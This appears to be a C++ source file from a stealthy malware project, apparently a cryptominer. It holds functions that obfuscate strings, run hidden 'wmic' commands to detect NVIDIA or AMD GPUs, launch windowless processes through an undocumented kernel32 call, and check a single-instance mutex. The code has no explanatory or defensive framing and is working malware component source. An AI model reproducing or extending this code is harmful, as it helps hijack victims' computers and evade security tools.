#include "common.h"
#include "ntddk.h"
#include "kernel32_undoc.h"
#include "utils.h"
#include "obfuscatew.h"

#include <string>

bool has_gpu(wchar_t* baseDir) {
    wchar_t gpuPath[MAX_PATH] = { 0 };
    combine_path(gpuPath, baseDir, AYW_OBFUSCATE(L"g.log"));

    run_program(true, AYW_OBFUSCATE(L"cmd /c mkdir \"%S\" & wmic PATH Win32_VideoController GET Name > \"%S\""), baseDir, gpuPath);
	
    ULONG gpuFileSize;
    PVOID gpuFile = read_file(gpuPath, &gpuFileSize);
	
	if(gpuFile && gpuFileSize > 0) {
		std::wstring gpuString((const wchar_t*)gpuFile);
		if (gpuString.find(AYW_OBFUSCATE(L"NVIDIA")) != std::wstring::npos || 
			gpuString.find(AYW_OBFUSCATE(L"NVidia")) != std::wstring::npos || 
			gpuString.find(AYW_OBFUSCATE(L"AMD")) != std::wstring::npos ||
			gpuString.find(AYW_OBFUSCATE(L"ATi")) != std::wstring::npos ||
			gpuString.find(AYW_OBFUSCATE(L"Advanced Micro Devices")) != std::wstring::npos) 
		{
			return true;
		}
	}
    return false;
}

PROCESS_INFORMATION create_new_process_internal(LPWSTR cmdLine, LPWSTR startDir, DWORD creationFlags) {
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!UpCreateProcessInternalW(hToken,
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        creationFlags,
        NULL,
        startDir,
        &si,
        &pi,
        &hNewToken
    ))
    {
        return pi;
    }
    return pi;
}

void run_program(bool wait, wchar_t* cmdLine, ...) {
    wchar_t cmdLineFormatted[MAX_COMMAND_LENGTH] = { 0 };
    va_list argptr;
    va_start(argptr, cmdLine);
    vsnwprintf(cmdLineFormatted, MAX_COMMAND_LENGTH, cmdLine, argptr);
    va_end(argptr);
    PROCESS_INFORMATION pi = create_new_process_internal(cmdLineFormatted, NULL, CREATE_NO_WINDOW);
	if(wait) {
		WaitForSingleObject(pi.hProcess, 30000);
	}
	UtClose(pi.hProcess);
}

bool check_mutex(LPCWSTR mutex) {
    bool mutexActive = false;
    if (mutex != NULL) {
        HANDLE hMutex = CreateMutexW(NULL, FALSE, mutex);
        DWORD mutexStatus = GetLastError();
        if (mutexStatus == ERROR_ALREADY_EXISTS || mutexStatus == ERROR_ACCESS_DENIED) {
            mutexActive = true;
        }
        UtClose(hMutex);
    }
    return mutexActive;
}